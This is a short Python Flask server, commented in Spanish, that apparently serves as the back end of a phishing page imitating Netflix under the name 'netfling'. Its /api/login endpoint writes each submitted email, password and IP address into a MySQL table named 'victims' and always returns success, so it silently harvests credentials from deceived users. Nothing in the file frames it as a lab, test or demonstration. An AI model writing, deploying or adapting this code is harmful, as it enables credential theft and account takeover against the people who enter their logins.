from flask import Flask, request, jsonify
import mysql.connector
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Conexión a MySQL
db = mysql.connector.connect(
    host="localhost",
    user="root",
    password="",
    database="netfling"
)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    cursor = db.cursor()
    cursor.execute("INSERT INTO victims (email, password, ip) VALUES (%s, %s, %s)", 
                   (data['email'], data['password'], request.remote_addr))
    db.commit()
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(debug=True)  # ¡Nunca usar debug=True en producción!